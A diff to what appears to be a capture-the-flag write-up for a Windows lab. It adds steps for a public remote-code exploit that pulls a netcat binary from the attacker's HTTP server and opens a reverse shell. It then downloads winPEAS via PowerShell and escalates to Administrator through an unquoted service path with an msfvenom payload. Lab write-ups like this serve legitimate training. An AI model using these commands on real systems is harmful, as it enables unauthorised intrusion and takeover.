@@ -326,16 +326,79 @@ listening on [any] 1234 ...
 ```
 {: .nolineno }
 
-Edit the exploit file (39161.py) and change the IP Adress and the port where you are listening:
+Edit the exploit file (39161.py) and change the IP Adress and the port where you are listening and save it as exploit.py:
 
 ```python
-	ip_addr = "192.168.44.128" #local IP address
+	ip_addr = "10.10.xxx.xxx" #local IP address
 	local_port = "4444" # Local Port number
 ```
 
 To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from GitHub!
 
-You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!
+```bash
+wget https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
+```
+The ncat.exe static binary need to be renamed to nc.exe, because it will be called that way in the exploit.
+
+```bash
+cp ncat.exe nc.exe
+```
+Now we need to open 2 terminals and set the server to transfer the binary, and a listener to receive a connection.
+
+```bash
+sudo python -m http.server 80
+```
+```bash
+nc -lvnp 4444
+```
+
+On a third terminal we will run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!
 
 > "No answer needed"
+
+```bash
+python2 exploit.py [target_IP] 8080
+
+python2 exploit.py [target_IP] 8080
+```
+
+On our listener terminal we should have:
+```bash
+Connect to [[YOUR-ATTACK-IP]] from (UNKNOWN) [[MACHINE-IP]] 49473
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
+```
+Now we can pull winPEAS to the system using powershell -c.
+```bash
+powershell -c wget http://[YOUR-ATTACK-IP]/winPEASany_ofs.exe -outfile winPEASany_ofs.exe
+```
+
+Now we can run it with...
+
+```bash
+winPEASany_ofs.exe
+```
+Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.
+
+Q2. What PowerShell -c command could we run to manually find out the service name?
+
+> powershell -c "Get-Service"
+
+Now let's escalate to the Administrator with our newfound knowledge.
+
+Generate your payload using msfvenom and pull it to the system using Powershell.
+
+Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.
+
+First we need to stop the service which we can do like so;
+```bash
+sc stop AdvancedSystemCareService9
+```
+Shortly followed by;
+```bash
+sc start AdvancedSystemCareService9
+```
+Once this command runs, you will see you gain a shell as Administrator on our listener!
 
